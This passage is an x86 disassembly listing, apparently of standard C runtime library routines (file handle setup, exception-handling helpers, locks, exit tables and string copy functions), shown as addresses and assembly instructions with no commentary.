  424fc4:	je     0x4250a7
  424fca:	mov    edi,DWORD PTR [eax]
  424fcc:	lea    ebp,[eax+0x4]
  424fcf:	lea    eax,[edi+ebp*1]
  424fd2:	mov    DWORD PTR [esp+0x10],eax
  424fd6:	mov    eax,0x800
  424fdb:	cmp    edi,eax
  424fdd:	jl     0x424fe1
  424fdf:	mov    edi,eax
  424fe1:	cmp    DWORD PTR ds:0x45e148,edi
  424fe7:	jge    0x425037
  424fe9:	mov    esi,0x45e164
  424fee:	push   ebx
  424fef:	call   0x426062
  424ff4:	test   eax,eax
  424ff6:	pop    ecx
  424ff7:	je     0x425031
  424ff9:	add    DWORD PTR ds:0x45e148,0x20
  425000:	mov    DWORD PTR [esi],eax
  425002:	lea    ecx,[eax+0x480]
  425008:	jmp    0x425020
  42500a:	and    BYTE PTR [eax+0x4],0x0
  42500e:	or     DWORD PTR [eax],0xffffffff
  425011:	and    DWORD PTR [eax+0x8],0x0
  425015:	mov    BYTE PTR [eax+0x5],0xa
  425019:	mov    ecx,DWORD PTR [esi]
  42501b:	add    eax,0x24
  42501e:	add    ecx,ebx
  425020:	cmp    eax,ecx
  425022:	jb     0x42500a
  425024:	add    esi,0x4
  425027:	cmp    DWORD PTR ds:0x45e148,edi
  42502d:	jl     0x424fee
  42502f:	jmp    0x425037
  425031:	mov    edi,DWORD PTR ds:0x45e148
  425037:	xor    ebx,ebx
  425039:	test   edi,edi
  42503b:	jle    0x4250a7
  42503d:	mov    eax,DWORD PTR [esp+0x10]
  425041:	mov    eax,DWORD PTR [eax]
  425043:	cmp    eax,0xffffffff
  425046:	je     0x42509c
  425048:	mov    cl,BYTE PTR [ebp+0x0]
  42504b:	test   cl,0x1
  42504e:	je     0x42509c
  425050:	test   cl,0x8
  425053:	jne    0x425060
  425055:	push   eax
  425056:	call   DWORD PTR ds:0x429088
  42505c:	test   eax,eax
  42505e:	je     0x42509c
  425060:	mov    ecx,ebx
  425062:	mov    eax,ebx
  425064:	and    eax,0x1f
  425067:	lea    eax,[eax+eax*8]
  42506a:	sar    ecx,0x5
  42506d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425074:	lea    esi,[ecx+eax*4]
  425077:	mov    eax,DWORD PTR [esp+0x10]
  42507b:	mov    eax,DWORD PTR [eax]
  42507d:	mov    DWORD PTR [esi],eax
  42507f:	mov    al,BYTE PTR [ebp+0x0]
  425082:	mov    BYTE PTR [esi+0x4],al
  425085:	lea    eax,[esi+0xc]
  425088:	push   0xfa0
  42508d:	push   eax
  42508e:	call   0x4263cd
  425093:	test   eax,eax
  425095:	pop    ecx
  425096:	pop    ecx
  425097:	je     0x4250c7
  425099:	inc    DWORD PTR [esi+0x8]
  42509c:	add    DWORD PTR [esp+0x10],0x4
  4250a1:	inc    ebx
  4250a2:	inc    ebp
  4250a3:	cmp    ebx,edi
  4250a5:	jl     0x42503d
  4250a7:	xor    ebx,ebx
  4250a9:	mov    ecx,DWORD PTR ds:0x45e160
  4250af:	lea    eax,[ebx+ebx*8]
  4250b2:	lea    esi,[ecx+eax*4]
  4250b5:	cmp    DWORD PTR [esi],0xffffffff
  4250b8:	jne    0x425129
  4250ba:	test   ebx,ebx
  4250bc:	mov    BYTE PTR [esi+0x4],0x81
  4250c0:	jne    0x4250cc
  4250c2:	push   0xfffffff6
  4250c4:	pop    eax
  4250c5:	jmp    0x4250d6
  4250c7:	or     eax,0xffffffff
  4250ca:	jmp    0x425145
  4250cc:	mov    eax,ebx
  4250ce:	dec    eax
  4250cf:	neg    eax
  4250d1:	sbb    eax,eax
  4250d3:	add    eax,0xfffffff5
  4250d6:	push   eax
  4250d7:	call   DWORD PTR ds:0x429064
  4250dd:	mov    edi,eax
  4250df:	cmp    edi,0xffffffff
  4250e2:	je     0x425123
  4250e4:	push   edi
  4250e5:	call   DWORD PTR ds:0x429088
  4250eb:	test   eax,eax
  4250ed:	je     0x425123
  4250ef:	and    eax,0xff
  4250f4:	cmp    eax,0x2
  4250f7:	mov    DWORD PTR [esi],edi
  4250f9:	jne    0x425101
  4250fb:	or     BYTE PTR [esi+0x4],0x40
  4250ff:	jmp    0x42510a
  425101:	cmp    eax,0x3
  425104:	jne    0x42510a
  425106:	or     BYTE PTR [esi+0x4],0x8
  42510a:	lea    eax,[esi+0xc]
  42510d:	push   0xfa0
  425112:	push   eax
  425113:	call   0x4263cd
  425118:	test   eax,eax
  42511a:	pop    ecx
  42511b:	pop    ecx
  42511c:	je     0x4250c7
  42511e:	inc    DWORD PTR [esi+0x8]
  425121:	jmp    0x42512d
  425123:	or     BYTE PTR [esi+0x4],0x40
  425127:	jmp    0x42512d
  425129:	or     BYTE PTR [esi+0x4],0x80
  42512d:	inc    ebx
  42512e:	cmp    ebx,0x3
  425131:	jl     0x4250a9
  425137:	push   DWORD PTR ds:0x45e148
  42513d:	call   DWORD PTR ds:0x429084
  425143:	xor    eax,eax
  425145:	pop    edi
  425146:	pop    esi
  425147:	pop    ebp
  425148:	pop    ebx
  425149:	add    esp,0x48
  42514c:	ret    
  42514d:	push   0xc
  42514f:	push   0x4295b0
  425154:	call   0x425340
  425159:	mov    DWORD PTR [ebp-0x1c],0x42a008
  425160:	cmp    DWORD PTR [ebp-0x1c],0x42a008
  425167:	jae    0x42518b
  425169:	and    DWORD PTR [ebp-0x4],0x0
  42516d:	mov    eax,DWORD PTR [ebp-0x1c]
  425170:	mov    eax,DWORD PTR [eax]
  425172:	test   eax,eax
  425174:	je     0x425181
  425176:	call   eax
  425178:	jmp    0x425181
  42517a:	xor    eax,eax
  42517c:	inc    eax
  42517d:	ret    
  42517e:	mov    esp,DWORD PTR [ebp-0x18]
  425181:	or     DWORD PTR [ebp-0x4],0xffffffff
  425185:	add    DWORD PTR [ebp-0x1c],0x4
  425189:	jmp    0x425160
  42518b:	call   0x42537b
  425190:	ret    
  425191:	push   0xc
  425193:	push   0x4295c0
  425198:	call   0x425340
  42519d:	mov    DWORD PTR [ebp-0x1c],0x42a010
  4251a4:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  4251ab:	jae    0x4251cf
  4251ad:	and    DWORD PTR [ebp-0x4],0x0
  4251b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251b4:	mov    eax,DWORD PTR [eax]
  4251b6:	test   eax,eax
  4251b8:	je     0x4251c5
  4251ba:	call   eax
  4251bc:	jmp    0x4251c5
  4251be:	xor    eax,eax
  4251c0:	inc    eax
  4251c1:	ret    
  4251c2:	mov    esp,DWORD PTR [ebp-0x18]
  4251c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251c9:	add    DWORD PTR [ebp-0x1c],0x4
  4251cd:	jmp    0x4251a4
  4251cf:	call   0x42537b
  4251d4:	ret    
  4251d5:	call   0x425416
  4251da:	mov    eax,ds:0x45d304
  4251df:	cmp    eax,0xffffffff
  4251e2:	je     0x4251f2
  4251e4:	push   eax
  4251e5:	call   DWORD PTR ds:0x429090
  4251eb:	or     DWORD PTR ds:0x45d304,0xffffffff
  4251f2:	ret    
  4251f3:	push   ebx
  4251f4:	push   esi
  4251f5:	call   DWORD PTR ds:0x429044
  4251fb:	push   DWORD PTR ds:0x45d304
  425201:	mov    ebx,eax
  425203:	call   DWORD PTR ds:0x4290a0
  425209:	mov    esi,eax
  42520b:	test   esi,esi
  42520d:	jne    0x425258
  42520f:	push   0x88
  425214:	push   0x1
  425216:	call   0x426458
  42521b:	mov    esi,eax
  42521d:	test   esi,esi
  42521f:	pop    ecx
  425220:	pop    ecx
  425221:	je     0x425250
  425223:	push   esi
  425224:	push   DWORD PTR ds:0x45d304
  42522a:	call   DWORD PTR ds:0x42909c
  425230:	test   eax,eax
  425232:	je     0x425250
  425234:	mov    DWORD PTR [esi+0x54],0x45d258
  42523b:	mov    DWORD PTR [esi+0x14],0x1
  425242:	call   DWORD PTR ds:0x429098
  425248:	or     DWORD PTR [esi+0x4],0xffffffff
  42524c:	mov    DWORD PTR [esi],eax
  42524e:	jmp    0x425258
  425250:	push   0x10
  425252:	call   0x424406
  425257:	pop    ecx
  425258:	push   ebx
  425259:	call   DWORD PTR ds:0x429094
  42525f:	mov    eax,esi
  425261:	pop    esi
  425262:	pop    ebx
  425263:	ret    
  425264:	call   0x4253cd
  425269:	test   eax,eax
  42526b:	je     0x42527d
  42526d:	call   DWORD PTR ds:0x4290a4
  425273:	cmp    eax,0xffffffff
  425276:	mov    ds:0x45d304,eax
  42527b:	jne    0x425285
  42527d:	call   0x4251d5
  425282:	xor    eax,eax
  425284:	ret    
  425285:	push   esi
  425286:	push   0x88
  42528b:	push   0x1
  42528d:	call   0x426458
  425292:	mov    esi,eax
  425294:	test   esi,esi
  425296:	pop    ecx
  425297:	pop    ecx
  425298:	je     0x4252ca
  42529a:	push   esi
  42529b:	push   DWORD PTR ds:0x45d304
  4252a1:	call   DWORD PTR ds:0x42909c
  4252a7:	test   eax,eax
  4252a9:	je     0x4252ca
  4252ab:	mov    DWORD PTR [esi+0x54],0x45d258
  4252b2:	mov    DWORD PTR [esi+0x14],0x1
  4252b9:	call   DWORD PTR ds:0x429098
  4252bf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252c3:	mov    DWORD PTR [esi],eax
  4252c5:	xor    eax,eax
  4252c7:	inc    eax
  4252c8:	pop    esi
  4252c9:	ret    
  4252ca:	call   0x4251d5
  4252cf:	xor    eax,eax
  4252d1:	pop    esi
  4252d2:	ret    
  4252d3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252da:	jne    0x4252e9
  4252dc:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252e3:	jb     0x4252e9
  4252e5:	xor    eax,eax
  4252e7:	inc    eax
  4252e8:	ret    
  4252e9:	push   0x3
  4252eb:	pop    eax
  4252ec:	ret    
  4252ed:	xor    eax,eax
  4252ef:	cmp    DWORD PTR [esp+0x4],eax
  4252f3:	push   0x0
  4252f5:	sete   al
  4252f8:	push   0x1000
  4252fd:	push   eax
  4252fe:	call   DWORD PTR ds:0x429034
  425304:	test   eax,eax
  425306:	mov    ds:0x45e140,eax
  42530b:	je     0x425337
  42530d:	call   0x4252d3
  425312:	cmp    eax,0x3
  425315:	mov    ds:0x45e144,eax
  42531a:	jne    0x42533a
  42531c:	push   0x3f8
  425321:	call   0x4266da
  425326:	test   eax,eax
  425328:	pop    ecx
  425329:	jne    0x42533a
  42532b:	push   DWORD PTR ds:0x45e140
  425331:	call   DWORD PTR ds:0x4290a8
  425337:	xor    eax,eax
  425339:	ret    
  42533a:	xor    eax,eax
  42533c:	inc    eax
  42533d:	ret    
  42533e:	int3   
  42533f:	int3   
  425340:	push   0x427208
  425345:	mov    eax,fs:0x0
  42534b:	push   eax
  42534c:	mov    eax,DWORD PTR [esp+0x10]
  425350:	mov    DWORD PTR [esp+0x10],ebp
  425354:	lea    ebp,[esp+0x10]
  425358:	sub    esp,eax
  42535a:	push   ebx
  42535b:	push   esi
  42535c:	push   edi
  42535d:	mov    eax,DWORD PTR [ebp-0x8]
  425360:	mov    DWORD PTR [ebp-0x18],esp
  425363:	push   eax
  425364:	mov    eax,DWORD PTR [ebp-0x4]
  425367:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42536e:	mov    DWORD PTR [ebp-0x8],eax
  425371:	lea    eax,[ebp-0x10]
  425374:	mov    fs:0x0,eax
  42537a:	ret    
  42537b:	mov    ecx,DWORD PTR [ebp-0x10]
  42537e:	mov    DWORD PTR fs:0x0,ecx
  425385:	pop    ecx
  425386:	pop    edi
  425387:	pop    esi
  425388:	pop    ebx
  425389:	leave  
  42538a:	push   ecx
  42538b:	ret    
  42538c:	int3   
  42538d:	int3   
  42538e:	int3   
  42538f:	int3   
  425390:	cmp    eax,0x1000
  425395:	jae    0x4253a5
  425397:	neg    eax
  425399:	add    eax,esp
  42539b:	add    eax,0x4
  42539e:	test   DWORD PTR [eax],eax
  4253a0:	xchg   esp,eax
  4253a1:	mov    eax,DWORD PTR [eax]
  4253a3:	push   eax
  4253a4:	ret    
  4253a5:	push   ecx
  4253a6:	lea    ecx,[esp+0x8]
  4253aa:	sub    ecx,0x1000
  4253b0:	sub    eax,0x1000
  4253b5:	test   DWORD PTR [ecx],eax
  4253b7:	cmp    eax,0x1000
  4253bc:	jae    0x4253aa
  4253be:	sub    ecx,eax
  4253c0:	mov    eax,esp
  4253c2:	test   DWORD PTR [ecx],eax
  4253c4:	mov    esp,ecx
  4253c6:	mov    ecx,DWORD PTR [eax]
  4253c8:	mov    eax,DWORD PTR [eax+0x4]
  4253cb:	push   eax
  4253cc:	ret    
  4253cd:	push   esi
  4253ce:	push   edi
  4253cf:	xor    esi,esi
  4253d1:	mov    edi,0x45dc20
  4253d6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253de:	jne    0x4253fe
  4253e0:	lea    eax,[esi*8+0x45d310]
  4253e7:	mov    DWORD PTR [eax],edi
  4253e9:	push   0xfa0
  4253ee:	push   DWORD PTR [eax]
  4253f0:	add    edi,0x18
  4253f3:	call   0x4263cd
  4253f8:	test   eax,eax
  4253fa:	pop    ecx
  4253fb:	pop    ecx
  4253fc:	je     0x42540a
  4253fe:	inc    esi
  4253ff:	cmp    esi,0x24
  425402:	jl     0x4253d6
  425404:	xor    eax,eax
  425406:	inc    eax
  425407:	pop    edi
  425408:	pop    esi
  425409:	ret    
  42540a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425412:	xor    eax,eax
  425414:	jmp    0x425407
  425416:	push   ebx
  425417:	mov    ebx,DWORD PTR ds:0x42908c
  42541d:	push   esi
  42541e:	mov    esi,0x45d310
  425423:	push   edi
  425424:	mov    edi,DWORD PTR [esi]
  425426:	test   edi,edi
  425428:	je     0x42543d
  42542a:	cmp    DWORD PTR [esi+0x4],0x1
  42542e:	je     0x42543d
  425430:	push   edi
  425431:	call   ebx
  425433:	push   edi
  425434:	call   0x425f4a
  425439:	and    DWORD PTR [esi],0x0
  42543c:	pop    ecx
  42543d:	add    esi,0x8
  425440:	cmp    esi,0x45d430
  425446:	jl     0x425424
  425448:	mov    esi,0x45d310
  42544d:	pop    edi
  42544e:	mov    eax,DWORD PTR [esi]
  425450:	test   eax,eax
  425452:	je     0x42545d
  425454:	cmp    DWORD PTR [esi+0x4],0x1
  425458:	jne    0x42545d
  42545a:	push   eax
  42545b:	call   ebx
  42545d:	add    esi,0x8
  425460:	cmp    esi,0x45d430
  425466:	jl     0x42544e
  425468:	pop    esi
  425469:	pop    ebx
  42546a:	ret    
  42546b:	push   ebp
  42546c:	mov    ebp,esp
  42546e:	mov    eax,DWORD PTR [ebp+0x8]
  425471:	push   DWORD PTR [eax*8+0x45d310]
  425478:	call   DWORD PTR ds:0x4290b0
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   ebp
  425481:	mov    ebp,esp
  425483:	push   esi
  425484:	mov    esi,DWORD PTR [ebp+0x8]
  425487:	lea    esi,[esi*8+0x45d310]
  42548e:	cmp    DWORD PTR [esi],0x0
  425491:	je     0x425498
  425493:	xor    eax,eax
  425495:	inc    eax
  425496:	jmp    0x4254fc
  425498:	push   edi
  425499:	push   0x18
  42549b:	call   0x426062
  4254a0:	mov    edi,eax
  4254a2:	test   edi,edi
  4254a4:	pop    ecx
  4254a5:	jne    0x4254b6
  4254a7:	call   0x4272e0
  4254ac:	mov    DWORD PTR [eax],0xc
  4254b2:	xor    eax,eax
  4254b4:	jmp    0x4254fb
  4254b6:	push   0xa
  4254b8:	call   0x4254ff
  4254bd:	cmp    DWORD PTR [esi],0x0
  4254c0:	pop    ecx
  4254c1:	jne    0x4254e9
  4254c3:	push   0xfa0
  4254c8:	push   edi
  4254c9:	call   0x4263cd
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254e5
  4254d4:	push   edi
  4254d5:	call   0x425f4a
  4254da:	push   0xa
  4254dc:	call   0x42546b
  4254e1:	pop    ecx
  4254e2:	pop    ecx
  4254e3:	jmp    0x4254a7
  4254e5:	mov    DWORD PTR [esi],edi
  4254e7:	jmp    0x4254f0
  4254e9:	push   edi
  4254ea:	call   0x425f4a
  4254ef:	pop    ecx
  4254f0:	push   0xa
  4254f2:	call   0x42546b
  4254f7:	xor    eax,eax
  4254f9:	pop    ecx
  4254fa:	inc    eax
  4254fb:	pop    edi
  4254fc:	pop    esi
  4254fd:	pop    ebp
  4254fe:	ret    
  4254ff:	push   ebp
  425500:	mov    ebp,esp
  425502:	mov    eax,DWORD PTR [ebp+0x8]
  425505:	push   esi
  425506:	lea    esi,[eax*8+0x45d310]
  42550d:	cmp    DWORD PTR [esi],0x0
  425510:	jne    0x425525
  425512:	push   eax
  425513:	call   0x425480
  425518:	test   eax,eax
  42551a:	pop    ecx
  42551b:	jne    0x425525
  42551d:	push   0x11
  42551f:	call   0x424406
  425524:	pop    ecx
  425525:	push   DWORD PTR [esi]
  425527:	call   DWORD PTR ds:0x4290b4
  42552d:	pop    esi
  42552e:	pop    ebp
  42552f:	ret    
  425530:	push   esi
  425531:	push   DWORD PTR ds:0x45e268
  425537:	call   0x427496
  42553c:	pop    ecx
  42553d:	mov    ecx,DWORD PTR ds:0x45e264
  425543:	mov    esi,eax
  425545:	mov    eax,ds:0x45e268
  42554a:	mov    edx,ecx
  42554c:	sub    edx,eax
  42554e:	add    edx,0x4
  425551:	cmp    esi,edx
  425553:	jae    0x4255a3
  425555:	mov    ecx,0x800
  42555a:	cmp    esi,ecx
  42555c:	jae    0x425560
  42555e:	mov    ecx,esi
  425560:	add    ecx,esi
  425562:	push   ecx
  425563:	push   eax
  425564:	call   0x4272e9
  425569:	test   eax,eax
  42556b:	pop    ecx
  42556c:	pop    ecx
  42556d:	jne    0x425586
  42556f:	add    esi,0x10
  425572:	push   esi
  425573:	push   DWORD PTR ds:0x45e268
  425579:	call   0x4272e9
  42557e:	test   eax,eax
  425580:	pop    ecx
  425581:	pop    ecx
  425582:	jne    0x425586
  425584:	pop    esi
  425585:	ret    
  425586:	mov    ecx,DWORD PTR ds:0x45e264
  42558c:	sub    ecx,DWORD PTR ds:0x45e268
  425592:	mov    ds:0x45e268,eax
  425597:	sar    ecx,0x2
  42559a:	lea    ecx,[eax+ecx*4]
  42559d:	mov    DWORD PTR ds:0x45e264,ecx
  4255a3:	mov    DWORD PTR [ecx],edi
  4255a5:	add    DWORD PTR ds:0x45e264,0x4
  4255ac:	mov    eax,edi
  4255ae:	pop    esi
  4255af:	ret    
  4255b0:	push   0x80
  4255b5:	call   0x426062
  4255ba:	test   eax,eax
  4255bc:	pop    ecx
  4255bd:	mov    ds:0x45e268,eax
  4255c2:	jne    0x4255c8
  4255c4:	push   0x18
  4255c6:	pop    eax
  4255c7:	ret    
  4255c8:	and    DWORD PTR [eax],0x0
  4255cb:	mov    eax,ds:0x45e268
  4255d0:	mov    ds:0x45e264,eax
  4255d5:	xor    eax,eax
  4255d7:	ret    
  4255d8:	push   0xc
  4255da:	push   0x4295d0
  4255df:	call   0x425340
  4255e4:	call   0x424651
  4255e9:	and    DWORD PTR [ebp-0x4],0x0
  4255ed:	mov    edi,DWORD PTR [ebp+0x8]
  4255f0:	call   0x425530
  4255f5:	mov    DWORD PTR [ebp-0x1c],eax
  4255f8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4255fc:	call   0x42560a
  425601:	mov    eax,DWORD PTR [ebp-0x1c]
  425604:	call   0x42537b
  425609:	ret    
  42560a:	call   0x42465a
  42560f:	ret    
  425610:	push   DWORD PTR [esp+0x4]
  425614:	call   0x4255d8
  425619:	neg    eax
  42561b:	sbb    eax,eax
  42561d:	neg    eax
  42561f:	pop    ecx
  425620:	dec    eax
  425621:	ret    
  425622:	push   ebp
  425623:	mov    ebp,esp
  425625:	sub    esp,0x10
  425628:	push   ebx
  425629:	xor    ebx,ebx
  42562b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425631:	push   esi
  425632:	push   edi
  425633:	jne    0x4256a2
  425635:	push   0x429640
  42563a:	call   DWORD PTR ds:0x4290b8
  425640:	mov    edi,eax
  425642:	cmp    edi,ebx
  425644:	je     0x4256dd
  42564a:	mov    esi,DWORD PTR ds:0x429020
  425650:	push   0x429634
  425655:	push   edi
  425656:	call   esi
  425658:	test   eax,eax
  42565a:	mov    ds:0x45dd70,eax
  42565f:	je     0x4256dd
  425661:	push   0x429624
  425666:	push   edi
  425667:	call   esi
  425669:	push   0x429610
  42566e:	push   edi
  42566f:	mov    ds:0x45dd74,eax
  425674:	call   esi
  425676:	cmp    DWORD PTR ds:0x45dac4,0x2
  42567d:	mov    ds:0x45dd78,eax
  425682:	jne    0x4256a2
  425684:	push   0x4295f4
  425689:	push   edi
  42568a:	call   esi
  42568c:	test   eax,eax
  42568e:	mov    ds:0x45dd80,eax
  425693:	je     0x4256a2
  425695:	push   0x4295dc
  42569a:	push   edi
  42569b:	call   esi
  42569d:	mov    ds:0x45dd7c,eax
  4256a2:	mov    eax,ds:0x45dd7c
  4256a7:	test   eax,eax
  4256a9:	je     0x4256e7
  4256ab:	call   eax
  4256ad:	test   eax,eax
  4256af:	je     0x4256ce
  4256b1:	lea    ecx,[ebp-0x4]
  4256b4:	push   ecx
  4256b5:	push   0xc
  4256b7:	lea    ecx,[ebp-0x10]
  4256ba:	push   ecx
  4256bb:	push   0x1
  4256bd:	push   eax
  4256be:	call   DWORD PTR ds:0x45dd80
  4256c4:	test   eax,eax
  4256c6:	je     0x4256ce
  4256c8:	test   BYTE PTR [ebp-0x8],0x1
  4256cc:	jne    0x4256e7
  4256ce:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256d5:	jb     0x4256e1
  4256d7:	or     BYTE PTR [ebp+0x12],0x20
  4256db:	jmp    0x425706
  4256dd:	xor    eax,eax
  4256df:	jmp    0x425716
  4256e1:	or     BYTE PTR [ebp+0x12],0x4
  4256e5:	jmp    0x425706
  4256e7:	mov    eax,ds:0x45dd74
  4256ec:	test   eax,eax
  4256ee:	je     0x425706
  4256f0:	call   eax
  4256f2:	mov    ebx,eax
  4256f4:	test   ebx,ebx
  4256f6:	je     0x425706
  4256f8:	mov    eax,ds:0x45dd78
  4256fd:	test   eax,eax
  4256ff:	je     0x425706
  425701:	push   ebx
  425702:	call   eax
  425704:	mov    ebx,eax
  425706:	push   DWORD PTR [ebp+0x10]
  425709:	push   DWORD PTR [ebp+0xc]
  42570c:	push   DWORD PTR [ebp+0x8]
  42570f:	push   ebx
  425710:	call   DWORD PTR ds:0x45dd70
  425716:	pop    edi
  425717:	pop    esi
  425718:	pop    ebx
  425719:	leave  
  42571a:	ret    
  42571b:	int3   
  42571c:	int3   
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   edi
  425721:	mov    edi,DWORD PTR [esp+0x8]
  425725:	jmp    0x425795
  425727:	lea    esp,[esp+0x0]
  42572e:	mov    edi,edi
  425730:	mov    ecx,DWORD PTR [esp+0x4]
  425734:	push   edi
  425735:	test   ecx,0x3
  42573b:	je     0x425750
  42573d:	mov    al,BYTE PTR [ecx]
  42573f:	add    ecx,0x1
  425742:	test   al,al
  425744:	je     0x425783
  425746:	test   ecx,0x3
  42574c:	jne    0x42573d
  42574e:	mov    edi,edi
  425750:	mov    eax,DWORD PTR [ecx]
  425752:	mov    edx,0x7efefeff
  425757:	add    edx,eax
  425759:	xor    eax,0xffffffff
  42575c:	xor    eax,edx
  42575e:	add    ecx,0x4
  425761:	test   eax,0x81010100
  425766:	je     0x425750
  425768:	mov    eax,DWORD PTR [ecx-0x4]
  42576b:	test   al,al
  42576d:	je     0x425792
  42576f:	test   ah,ah
  425771:	je     0x42578d
  425773:	test   eax,0xff0000
  425778:	je     0x425788
  42577a:	test   eax,0xff000000
  42577f:	je     0x425783
  425781:	jmp    0x425750
  425783:	lea    edi,[ecx-0x1]
  425786:	jmp    0x425795
  425788:	lea    edi,[ecx-0x2]
  42578b:	jmp    0x425795
  42578d:	lea    edi,[ecx-0x3]
  425790:	jmp    0x425795
  425792:	lea    edi,[ecx-0x4]
  425795:	mov    ecx,DWORD PTR [esp+0xc]
  425799:	test   ecx,0x3
  42579f:	je     0x4257be
  4257a1:	mov    dl,BYTE PTR [ecx]
  4257a3:	add    ecx,0x1
  4257a6:	test   dl,dl
  4257a8:	je     0x425810
  4257aa:	mov    BYTE PTR [edi],dl
  4257ac:	add    edi,0x1
  4257af:	test   ecx,0x3
  4257b5:	jne    0x4257a1
  4257b7:	jmp    0x4257be
  4257b9:	mov    DWORD PTR [edi],edx
  4257bb:	add    edi,0x4
  4257be:	mov    edx,0x7efefeff
  4257c3:	mov    eax,DWORD PTR [ecx]
  4257c5:	add    edx,eax
  4257c7:	xor    eax,0xffffffff
  4257ca:	xor    eax,edx
  4257cc:	mov    edx,DWORD PTR [ecx]
  4257ce:	add    ecx,0x4
  4257d1:	test   eax,0x81010100
  4257d6:	je     0x4257b9
  4257d8:	test   dl,dl
  4257da:	je     0x425810
  4257dc:	test   dh,dh
  4257de:	je     0x425807
  4257e0:	test   edx,0xff0000
  4257e6:	je     0x4257fa
  4257e8:	test   edx,0xff000000
  4257ee:	je     0x4257f2
  4257f0:	jmp    0x4257b9
  4257f2:	mov    DWORD PTR [edi],edx
  4257f4:	mov    eax,DWORD PTR [esp+0x8]
  4257f8:	pop    edi
  4257f9:	ret    
  4257fa:	mov    WORD PTR [edi],dx
  4257fd:	mov    eax,DWORD PTR [esp+0x8]
  425801:	mov    BYTE PTR [edi+0x2],0x0
  425805:	pop    edi
  425806:	ret    
  425807:	mov    WORD PTR [edi],dx
  42580a:	mov    eax,DWORD PTR [esp+0x8]
  42580e:	pop    edi
  42580f:	ret    
  425810:	mov    BYTE PTR [edi],dl
  425812:	mov    eax,DWORD PTR [esp+0x8]
  425816:	pop    edi
  425817:	ret    
  425818:	int3   
  425819:	int3   
  42581a:	int3   
  42581b:	int3   
  42581c:	int3   
  42581d:	int3   
  42581e:	int3   
  42581f:	int3   
  425820:	mov    ecx,DWORD PTR [esp+0xc]
  425824:	push   edi
  425825:	test   ecx,ecx
  425827:	je     0x4258bf
  42582d:	push   esi
  42582e:	push   ebx
  42582f:	mov    ebx,ecx
  425831:	mov    esi,DWORD PTR [esp+0x14]
  425835:	test   esi,0x3
  42583b:	mov    edi,DWORD PTR [esp+0x10]
  42583f:	jne    0x42584c
  425841:	shr    ecx,0x2
  425844:	jne    0x4258cf
  42584a:	jmp    0x425873
  42584c:	mov    al,BYTE PTR [esi]
  42584e:	add    esi,0x1
  425851:	mov    BYTE PTR [edi],al
  425853:	add    edi,0x1
  425856:	sub    ecx,0x1
  425859:	je     0x425886
  42585b:	test   al,al
  42585d:	je     0x42588e
  42585f:	test   esi,0x3
  425865:	jne    0x42584c
  425867:	mov    ebx,ecx
  425869:	shr    ecx,0x2
  42586c:	jne    0x4258cf
  42586e:	and    ebx,0x3
  425871:	je     0x425886
  425873:	mov    al,BYTE PTR [esi]
  425875:	add    esi,0x1
  425878:	mov    BYTE PTR [edi],al
  42587a:	add    edi,0x1
  42587d:	test   al,al
  42587f:	je     0x4258b8
  425881:	sub    ebx,0x1
  425884:	jne    0x425873
  425886:	mov    eax,DWORD PTR [esp+0x10]
  42588a:	pop    ebx
  42588b:	pop    esi
  42588c:	pop    edi
  42588d:	ret    
  42588e:	test   edi,0x3
  425894:	je     0x4258ac
  425896:	mov    BYTE PTR [edi],al
  425898:	add    edi,0x1
  42589b:	sub    ecx,0x1
  42589e:	je     0x42593c
  4258a4:	test   edi,0x3
  4258aa:	jne    0x425896
  4258ac:	mov    ebx,ecx
  4258ae:	shr    ecx,0x2
  4258b1:	jne    0x425927
  4258b3:	mov    BYTE PTR [edi],al
  4258b5:	add    edi,0x1
  4258b8:	sub    ebx,0x1
  4258bb:	jne    0x4258b3
  4258bd:	pop    ebx
  4258be:	pop    esi
  4258bf:	mov    eax,DWORD PTR [esp+0x8]
  4258c3:	pop    edi
  4258c4:	ret    
  4258c5:	mov    DWORD PTR [edi],edx
  4258c7:	add    edi,0x4
  4258ca:	sub    ecx,0x1
  4258cd:	je     0x42586e
  4258cf:	mov    edx,0x7efefeff
  4258d4:	mov    eax,DWORD PTR [esi]
  4258d6:	add    edx,eax
  4258d8:	xor    eax,0xffffffff
  4258db:	xor    eax,edx
  4258dd:	mov    edx,DWORD PTR [esi]
  4258df:	add    esi,0x4
  4258e2:	test   eax,0x81010100
  4258e7:	je     0x4258c5
  4258e9:	test   dl,dl
  4258eb:	je     0x425919
  4258ed:	test   dh,dh
  4258ef:	je     0x42590f
  4258f1:	test   edx,0xff0000
  4258f7:	je     0x425905
  4258f9:	test   edx,0xff000000
  4258ff:	jne    0x4258c5
  425901:	mov    DWORD PTR [edi],edx
  425903:	jmp    0x42591d
  425905:	and    edx,0xffff
  42590b:	mov    DWORD PTR [edi],edx
  42590d:	jmp    0x42591d
  42590f:	and    edx,0xff
  425915:	mov    DWORD PTR [edi],edx
  425917:	jmp    0x42591d
  425919:	xor    edx,edx
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	add    edi,0x4
  425920:	xor    eax,eax
  425922:	sub    ecx,0x1
  425925:	je     0x425933
  425927:	xor    eax,eax
  425929:	mov    DWORD PTR [edi],eax
  42592b:	add    edi,0x4
  42592e:	sub    ecx,0x1
  425931:	jne    0x425929
  425933:	and    ebx,0x3
  425936:	jne    0x4258b3
  42593c:	mov    eax,DWORD PTR [esp+0x10]
  425940:	pop    ebx
  425941:	pop    esi
  425942:	pop    edi
  425943:	ret    
  425944:	int3   
  425945:	int3   
  425946:	int3   
  425947:	int3   
  425948:	int3   
  425949:	int3   
  42594a:	int3   
  42594b:	int3   
  42594c:	int3   
  42594d:	int3   
  42594e:	int3   
  42594f:	int3   
  425950:	mov    ecx,DWORD PTR [esp+0x4]
